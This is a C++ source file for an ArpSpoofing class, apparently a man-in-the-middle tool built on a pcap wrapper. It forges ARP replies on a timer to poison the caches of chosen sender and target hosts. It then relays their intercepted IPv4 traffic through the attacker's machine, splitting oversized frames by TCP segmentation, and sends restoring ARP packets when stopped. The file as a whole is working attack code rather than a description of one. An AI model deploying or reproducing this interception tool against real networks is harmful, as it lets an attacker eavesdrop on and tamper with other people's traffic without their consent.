#include "arpspoofing.h"

using namespace std;


void ArpSpoofing::RecvPacketThreadFunc() {
    auto lastTime = std::chrono::steady_clock::now();
    int tickTime = 5000;
    while(1) {
        usleep(10);

        switch(this->status_) {
            case STATUS_INIT: {
                break;
            }
            case STATUS_PAUSE: {
                unique_lock<mutex> t(this->mtx_);
                this->cv_.wait(t);
                t.unlock();
                break;
            }
            case STATUS_PLAY: {
                unique_lock<mutex> t(this->mtx_);

                auto currentTime = std::chrono::steady_clock::now();

                if(std::chrono::duration_cast<std::chrono::milliseconds>(currentTime - lastTime).count() > tickTime) {
                    lastTime = currentTime;
                    for(const Flow& f : this->flowList_)
                        this->Infect(this->arpTable_[f.tip_], f.sip_, f.tip_);
                }

                if(this->ReadPacket())
                    this->Relay(this->recvData_);
                t.unlock();
                break;
            }
            case STATUS_END: {
                //TODO Recvoer
                goto END;
                break;
            }
        defualt:
            break;
        }
    }
END:
    return;
}

void ArpSpoofing::WarningMessage(const string& msg) {
    cout<<"[WarningMessage] \n"<<"Reason : "<<msg<<endl;
}

void ArpSpoofing::ErrorMessage(const string& msg) {
    cerr<<"[ErrorMessage] \n"<<"ERROR : "<<msg<<endl<<endl;
    exit(1);
}

bool ArpSpoofing::RegistgerArpTable(const Ip& ip) {
    if(arpTable_.count(ip)) WarningMessage("[RegistgerArpTable] It is already registered in the ARP table.");

    Mac mac = ResolveMac(ip);
    if(!mac.isNull()) {
        arpTable_[ip] = mac;
        return true;
    }

    WarningMessage("[RegistgerArpTable] Failed to call ResolveMac");

    return false;
}

uint16_t ArpSpoofing::MakeWord(const uint8_t& a, const uint8_t& b) {
    return static_cast<uint16_t>((a | (b << 8)));
}

Mac ArpSpoofing::ResolveMac(const Ip& targetIP) {
    string cmd = "ping -c 1  " + string(targetIP);
    system(cmd.c_str());

    Mac ret{};

    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0)
            throw runtime_error("Failed to create socket");

        arpreq req{};

        memcpy(req.arp_dev, cInterfaceInfo_.interfaceName_.data(), sizeof(req.arp_dev));

        req.arp_pa.sa_family = AF_INET;
         reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr.s_addr = htonl(targetIP);

        if(ioctl(sock, SIOCGARP, &req) == -1)
            throw runtime_error("Failed to set ioctl");

        ret = reinterpret_cast<u_char*>(req.arp_ha.sa_data);

    }catch(const exception& e) {
        cerr<<"[ResolveMac] "<<e.what()<<endl;
        cerr<<"Error : "<<errno<<" ("<<strerror(errno)<<")"<<endl;
    }

    close(sock);

    return ret;
}

void ArpSpoofing::SetIpChecksum(PIpHdr ipHeader) {
    uint8_t* data = reinterpret_cast<uint8_t*>(ipHeader);
    uint32_t len = ipHeader->len();

    ipHeader->headerChecksum_ = 0;

    uint32_t acc = 0;

    for(int i=0; i + 1< len; i+=2)
        acc += MakeWord(data[i], data[i + 1]);

    if(len & 1) acc+= static_cast<uint16_t>(data[len-1] << 8);
    while(acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);

    ipHeader->headerChecksum_ = ~acc;
}

void ArpSpoofing::SetTcpChecksum(const uint16_t payloadLen, const PIpHdr ipHeader, PTcpHdr tcpHeader) {
    uint16_t len = tcpHeader->len() + payloadLen;

    tcpHeader->checksum_ = 0;

    TcpHdr::PseudoHdr pseudoHeader{};

    pseudoHeader.sip_ = ipHeader->sip_;
    pseudoHeader.dip_ = ipHeader->dip_;
    pseudoHeader.reserved_ = 0;
    pseudoHeader.protocol_ = ipHeader->protocolId_;
    pseudoHeader.len_ = htons(len);

    uint32_t acc = 0;

    uint8_t* pseudoHeaderPtr = reinterpret_cast<uint8_t*>(&pseudoHeader);

    for(int i = 0; i + 1 < sizeof(TcpHdr::PseudoHdr); i += 2)
        acc += MakeWord(pseudoHeaderPtr[i], pseudoHeaderPtr[i + 1]);

    uint8_t* tcpHeaderPtr = reinterpret_cast<uint8_t*>(tcpHeader);

    for(int i = 0; i + 1 < len; i += 2)
        acc += MakeWord(tcpHeaderPtr[i], tcpHeaderPtr[i + 1]);

    if(len & 1) acc += static_cast<uint16_t>(tcpHeaderPtr[len - 1] << 8);

    while(acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);

    tcpHeader->checksum_ = ~acc;
}

vector<ArpSpoofing::JumboFramePacket> ArpSpoofing::JumboFrameProcessingWithIpFragment(const Packet& jPacket) {
    PEthHdr oriEtherHeader = reinterpret_cast<PEthHdr>(jPacket.buf);
    PIpHdr oriIpHeader = reinterpret_cast<PIpHdr>(jPacket.buf + sizeof(EthHdr));

    //udp or tcp
    const int ipHeaderLen = oriIpHeader->len();
    const int totalHeaderLen = sizeof(EthHdr) + ipHeaderLen;
    const int maxFragmentPacketSize = MAX_MTU - ipHeaderLen;
    int remainingPacketSize = jPacket.header->caplen - sizeof(EthHdr) - ipHeaderLen;

    int sendedPacketSize = 0;
    int fragmentPacketSize = 0;
    int fragmentOffset = 0;

    std::vector<JumboFramePacket> pks{};


    while(remainingPacketSize > 0) {
        JumboFramePacket pk{};

        fragmentPacketSize = maxFragmentPacketSize > remainingPacketSize
                                 ? remainingPacketSize : maxFragmentPacketSize;

        shared_ptr<uint8_t[]> fragmentPacketBuf(new uint8_t[fragmentPacketSize + totalHeaderLen]);
        //header
        memcpy(fragmentPacketBuf.get(), jPacket.buf, totalHeaderLen);

        //data
        memcpy(fragmentPacketBuf.get() + totalHeaderLen, jPacket.buf + totalHeaderLen + sendedPacketSize, fragmentPacketSize);

        PIpHdr ipHeader = reinterpret_cast<PIpHdr>(fragmentPacketBuf.get() + sizeof(EthHdr));

        ipHeader->flags_fragOffset_ = remainingPacketSize > maxFragmentPacketSize
                                          ? htons(IpHdr::IP_FLAGS_TYPE::MF | fragmentOffset)
                                          : htons(IpHdr::IP_FLAGS_TYPE::RESORVED | fragmentOffset);

        ipHeader->totalPacketLen_ = htons(ipHeaderLen + fragmentPacketSize);
        SetIpChecksum(ipHeader);


        remainingPacketSize -= fragmentPacketSize;
        sendedPacketSize += fragmentPacketSize;
        fragmentOffset += fragmentPacketSize / 8;

        pk.buf_ = fragmentPacketBuf;
        pk.size_ = totalHeaderLen + fragmentPacketSize;

        pks.push_back(pk);
        //SendPacket(reinterpret_cast<uint8_t*>(fragmentPacketBuf.get()), totalHeaderLen + fragmentPacketSize);
    }

    return pks;
}

vector<ArpSpoofing::JumboFramePacket> ArpSpoofing::JumboFrameProcessingWithTcpSegment(const Packet& jPacket) {
    PEthHdr oriEtherHeader = reinterpret_cast<PEthHdr>(jPacket.buf);
    PIpHdr oriIpHeader = reinterpret_cast<PIpHdr>(jPacket.buf + sizeof(EthHdr));
    PTcpHdr oriTcpHeader = reinterpret_cast<PTcpHdr>(jPacket.buf + sizeof(EthHdr) + oriIpHeader->len());

    const uint32_t totalHeaderLen = sizeof(EthHdr) + oriIpHeader->len() + oriTcpHeader->len();
    uint32_t tcpPayloadSize = oriIpHeader->totalLen() - oriIpHeader->len() - oriTcpHeader->len();

    uint32_t sendBytes = 0, sendedBytes = 0;

    vector<JumboFramePacket> pks{};

    while(tcpPayloadSize) {
        JumboFramePacket pk{};

        sendBytes = tcpPayloadSize > MAX_MSS ? MAX_MSS : tcpPayloadSize;
        shared_ptr<uint8_t[]> segmentPacket(new uint8_t[MAX_MSS + totalHeaderLen]);

        //header
        memcpy(segmentPacket.get(), jPacket.buf, totalHeaderLen);
        //data
        memcpy(segmentPacket.get() + totalHeaderLen, jPacket.buf + totalHeaderLen + sendedBytes, sendBytes);



        PIpHdr ipHeader = reinterpret_cast<PIpHdr>(segmentPacket.get() + sizeof(EthHdr));
        ipHeader->totalPacketLen_ = htons(oriIpHeader->len() + oriTcpHeader->len() + sendBytes);
        //id?
        ipHeader->id_ += (1 << 8);
        //checksum?
        SetIpChecksum(ipHeader);

        PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(segmentPacket.get() + sizeof(EthHdr) + ipHeader->len());
        tcpHeader->seqNumber_ =  htonl(ntohl(oriTcpHeader->seqNumber_) + sendedBytes);
        //checksum?
        SetTcpChecksum(sendBytes, ipHeader, tcpHeader);

        sendedBytes += sendBytes;
        tcpPayloadSize -= sendBytes;

        pk.buf_ = segmentPacket;
        pk.size_ = totalHeaderLen + sendBytes;
        pks.push_back(pk);

        //SendPacket(segmentPacket.get(), totalHeaderLen + sendBytes);
    }

    return pks;
}

std::vector<ArpSpoofing::JumboFramePacket> ArpSpoofing::GetJumboFramePackets(const Packet& jPacket, JumboFrameMethod method) {
    std::vector<JumboFramePacket> pks{};
    switch(method) {
    case IpFramgent:
        pks = JumboFrameProcessingWithIpFragment(jPacket);
        break;
    case TCPSegment:
        pks = JumboFrameProcessingWithTcpSegment(jPacket);
        break;
    default:
        WarningMessage("[GetJumboFramePackets] Method not found.");
        break;
    }

    return pks;
}


EthArpPacket ArpSpoofing::MakeEthArpPacket(const Mac& ethSmac, const Mac& ethDmac, const Mac& arpSmac, const Mac& arpTmac, const Ip& arpSip, const Ip& arpTip, const ArpHdr::OpCodeType opCode) {
    EthArpPacket packet{};

    packet.eth_.dmac_ = ethDmac;
    packet.arp_.tmac_ = arpTmac;

    packet.eth_.smac_ = ethSmac;
    packet.arp_.smac_ = arpSmac;

    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
    packet.arp_.protocolType_ = htons(EthHdr::Ip4);
    packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
    packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
    packet.arp_.opCode_ = htons(opCode);

    packet.arp_.sip_ = htonl(arpSip);
    packet.arp_.tip_ = htonl(arpTip);

    return packet;
}

bool ArpSpoofing::Infect(const Mac& targetMac, const Ip& senderIP, const Ip& targetIP, const ArpHdr::OpCodeType opCode) {
    try {
        if(targetMac.isNull()) throw runtime_error("target mac is null");

        EthArpPacket packet = MakeEthArpPacket(cInterfaceInfo_.mac_, targetMac, cInterfaceInfo_.mac_, targetMac, senderIP, targetIP, opCode);
        this->SendPacket(reinterpret_cast<uint8_t*>(&packet), sizeof(EthArpPacket));

    }catch(const std::exception& e) {
        cerr<<"[Infect] "<<e.what()<<endl;
        return false;
    }
    return true;
}

bool ArpSpoofing::Recover(const Mac& senderMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP, const ArpHdr::OpCodeType opCode) {
    try {
        if(targetMac.isNull()) throw runtime_error("target mac is null");

        EthArpPacket packet = MakeEthArpPacket(cInterfaceInfo_.mac_, targetMac, senderMac, targetMac, senderIP, targetIP, opCode);

        SendPacket(reinterpret_cast<uint8_t*>(&packet), sizeof(EthArpPacket));

    }catch(const std::exception& e) {
        cerr<<"[Recover] "<<e.what()<<endl;
        return false;
    }
    return true;
}

void ArpSpoofing::Relay(Packet& rPacket) {
    PEthHdr etherHeader = reinterpret_cast<PEthHdr>(rPacket.buf);
    PArpHdr arpHeader = reinterpret_cast<PArpHdr>(rPacket.buf + sizeof(EthHdr));
    PIpHdr ipHeader = reinterpret_cast<PIpHdr>(rPacket.buf + sizeof(EthHdr));
    //PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(rPacket.buf + sizeof(EthHdr) + ipHeader->len());

    for(const Flow& f : flowList_) {
        //arp
        //sender -> target
        if(etherHeader->type() == EthHdr::Arp && (ntohl(arpHeader->sip_) == f.sip_ && ntohl(arpHeader->tip_) == f.tip_)) {
            if(!Infect(arpTable_[f.tip_], f.sip_, f.tip_)) {
                cout<<"Failed to infect \n";
            }
            break;
        }

        //icmp
        //tcp
        //udp
        //sender -> target
        if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->sip_) == f.sip_ && ntohl(ipHeader->dip_) != cInterfaceInfo_.ip_)) {
            etherHeader->smac_ = cInterfaceInfo_.mac_;
            etherHeader->dmac_ = arpTable_[f.tip_];

            //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
            if(rPacket.header->len > MAX_MTU) {
                vector<JumboFramePacket> packets = GetJumboFramePackets(rPacket, JumboFrameMethod::TCPSegment);
                for(const JumboFramePacket& p : packets)
                    SendPacket(p.buf_.get(), p.size_);
            }else
                SendPacket(rPacket.buf, rPacket.header->caplen);

            break;
        }

        //target -> sender
        if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->dip_) == f.sip_ && ntohl(ipHeader->dip_) != cInterfaceInfo_.ip_)) {
            etherHeader->smac_ = cInterfaceInfo_.mac_;
            //etherHeader->dmac_ = arpTable[f.tip_];
            etherHeader->dmac_ = arpTable_[f.sip_];

            //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
            if(rPacket.header->len > MAX_MTU) {
                vector<JumboFramePacket> packets = GetJumboFramePackets(rPacket, JumboFrameMethod::TCPSegment);
                for(const JumboFramePacket& p : packets)
                    SendPacket(p.buf_.get(), p.size_);
            }else
                SendPacket(rPacket.buf, rPacket.header->caplen);

            break;
        }
    }
}

//public
ArpSpoofing::ArpSpoofing() {
    OpenThread();
}

ArpSpoofing::~ArpSpoofing() {
    this->end();
    this->hPThread_.join();
}



void ArpSpoofing::Register(const QString senderIP, const QString targetIP) {
    unique_lock<mutex> t(mtx_);
    Flow f(senderIP, targetIP);

    if(RegistgerArpTable(senderIP) && RegistgerArpTable(targetIP))
        flowList_.push_back(f);
}

void ArpSpoofing::Register(const Flow flow) {
    unique_lock<mutex> t(mtx_);

    if(RegistgerArpTable(flow.sip_) && RegistgerArpTable(flow.tip_))
        flowList_.push_back(flow);
}

void ArpSpoofing::Register(const std::vector<Flow> flow) {
    unique_lock<mutex> t(mtx_);
    for(const Flow& f : flow) {
        if(RegistgerArpTable(f.sip_) && RegistgerArpTable(f.tip_))
            flowList_.push_back(f);
    }
}

void ArpSpoofing::Delete(const QString senderIP, const QString targetIP) {
    unique_lock<mutex> t(mtx_);

    flowList_.remove(Flow(senderIP, targetIP));
}

void ArpSpoofing::Delete(const Flow flow) {
    unique_lock<mutex> t(mtx_);

    flowList_.remove(flow);
}

void ArpSpoofing::Delete(const std::vector<Flow> flow) {
    unique_lock<mutex> t(mtx_);

    for(const Flow& f : flow) {
        flowList_.remove(f);
    }
}

list<Flow> ArpSpoofing::GetFlows() {
    unique_lock<mutex> t(mtx_);
    return flowList_;
}

void ArpSpoofing::Stop(){
    for(const Flow& f : flowList_)
        Recover(arpTable_[f.sip_], arpTable_[f.tip_], f.sip_, f.tip_);
    PcapController::Stop();
}

void ArpSpoofing::Run() {
    for(const Flow& f : flowList_)
        Infect(arpTable_[f.tip_], f.sip_, f.tip_);

    play();
}
